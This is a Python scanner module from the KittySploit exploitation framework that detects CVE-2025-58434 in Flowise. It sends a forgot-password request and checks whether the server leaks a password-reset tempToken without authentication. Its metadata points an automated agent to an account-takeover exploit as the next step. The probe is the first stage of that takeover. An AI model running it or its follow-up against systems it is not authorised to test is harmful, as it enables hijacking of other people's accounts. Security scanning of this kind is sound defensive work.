#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2025-58434 — Flowise forgot-password token leak detection."""

from __future__ import annotations

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_TOKEN_RE = re.compile(r'"tempToken"\s*:\s*"[A-Za-z0-9]{64}"')


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Flowise CVE-2025-58434 reset token leak detect",
        "description": "Probes forgot-password for leaked tempToken (Flowise <= 3.0.5).",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2025-58434"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-58434"],
        "tags": ["flowise", "scanner", "cve-2025-58434"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/flowise_cve_2025_58434_account_takeover",
                ],
            },
        },
    }

    port = OptPort(3000, "Flowise port", required=False)

    def run(self):
        r = self.http_request(method="GET", path="/", allow_redirects=True)
        if not r or "flowise" not in (r.text or "").lower():
            return False
        resp = self.http_request(
            method="POST",
            path="/api/v1/account/forgot-password",
            data=json.dumps({"user": {"email": "probe@example.test"}}),
            headers={"Content-Type": "application/json"},
        )
        if not resp or int(resp.status_code or 0) != 201:
            return False
        if not _TOKEN_RE.search(resp.text or ""):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-58434",
            reason="forgot-password returns tempToken without authentication",
        )
        return True